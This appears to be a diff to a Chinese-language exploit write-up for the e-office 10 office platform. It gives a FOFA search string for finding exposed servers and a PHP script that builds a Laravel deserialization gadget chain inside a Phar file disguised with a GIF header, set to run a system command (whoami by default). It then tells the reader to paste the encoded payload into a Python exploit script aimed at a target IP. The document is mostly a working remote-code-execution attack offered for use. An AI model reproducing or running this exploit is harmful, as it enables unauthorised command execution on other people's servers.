@@ -1,3 +1,76 @@
+资产指纹：fofa: body="eoffice10" && body="eoffice_loading_ti"
+1. 修改以下php代码为想要执行的函数以及参数(默认执行system('whoami'))，然后运行之后会在当前目录生成phar_base64.txt。
+
+<?php
+
+namespace Illuminate\Broadcasting {
+
+    class PendingBroadcast {
+        protected $events;
+        protected $event;
+
+        public function __construct($events, $event) {
+            $this->events = $events;
+            $this->event = $event;
+        }
+    }
+
+    class BroadcastEvent {
+        protected $connection;
+
+        public function __construct($connection) {
+            $this->connection = $connection;
+        }
+    }
+
+}
+
+namespace Illuminate\Bus {
+
+    class Dispatcher {
+        protected $queueResolver;
+
+        public function __construct($queueResolver) {
+            $this->queueResolver = $queueResolver;
+        }
+
+    }
+}
+
+namespace {
+
+    $command = new \Illuminate\Broadcasting\BroadcastEvent('whoami');
+    $dispatcher = new \Illuminate\Bus\Dispatcher("system");
+    $pendingBroadcast = new \Illuminate\Broadcasting\PendingBroadcast($dispatcher, $command);
+
+    // 临时文件路径
+    $tempPharPath = 'phar.phar';
+
+    // 创建 Phar
+    $phar = new \Phar($tempPharPath);
+    $phar->startBuffering();
+    $phar->setStub("GIF89a" . "<?php __HALT_COMPILER(); ?>");
+    $phar->addFromString('test.txt', 'test');
+    $phar->setMetadata($pendingBroadcast);
+    $phar->stopBuffering();
+
+   
+    $pharData = file_get_contents($tempPharPath);
+
+    $base64PharData = base64_encode($pharData);
+
+    $base64OutputFilePath = 'phar_base64.txt';
+    file_put_contents($base64OutputFilePath, $base64PharData);
+
+    
+    unset($phar); 
+    unlink($tempPharPath); 
+
+    echo "Base64编码的Phar数据已写入到当前目录文件 {$base64OutputFilePath}";
+
+}
+2. 复制文件内容，替换目标IP，file_content运行脚本即可。
+
 import requests
 import base64
 import re
@@ -51,6 +124,5 @@ def exploit(url):
         print("漏洞不存在.")
         print(response3.text)
 
-if __name__ == "__main__":
-    target_url = input("请输入URL结尾不能带/: ")
-    exploit(target_url)
+target_url = "http://xxx:8010"
+exploit(target_url)
